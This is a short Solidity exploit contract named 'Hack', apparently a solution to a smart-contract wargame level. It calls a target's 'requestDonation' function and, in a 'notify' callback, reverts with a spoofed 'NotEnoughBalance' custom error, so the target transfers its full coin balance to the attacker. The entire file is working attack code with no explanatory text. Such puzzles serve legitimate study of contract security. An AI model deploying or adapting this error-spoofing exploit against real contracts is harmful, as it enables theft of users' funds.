pragma solidity ^0.8;

interface IGood {
    function coin() external view returns (address);
    function requestDonation() external returns (bool enoughBalance);
}

interface ICoin {
    function balances(address) external view returns (uint256);
}

contract Hack {
    IGood private immutable target;
    ICoin private immutable coin;

    error NotEnoughBalance();

    constructor(IGood _target) {
        target = _target;
        coin = ICoin(_target.coin());
    }

    function pwn() external {
        target.requestDonation();
        require(coin.balances(address(this)) == 10 ** 6, "hack failed");
    }

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
